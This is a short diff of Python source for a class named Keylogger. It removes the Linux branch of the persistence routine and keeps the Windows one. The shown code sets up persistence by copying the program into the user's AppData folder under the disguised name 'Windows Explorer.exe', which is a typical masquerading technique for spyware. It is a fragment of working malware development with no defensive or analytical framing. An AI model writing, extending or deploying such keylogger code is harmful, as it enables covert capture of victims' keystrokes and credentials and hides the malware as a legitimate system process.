@@ -62,8 +62,6 @@ class Keylogger:
     def become_persistent(self):
         if sys.platform.startswith("win"):
             self.become_persistent_on_windows()
-        elif sys.platform.startswith("linux"):
-            self.become_persistent_on_linux()
 
     def become_persistent_on_windows(self):
         evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
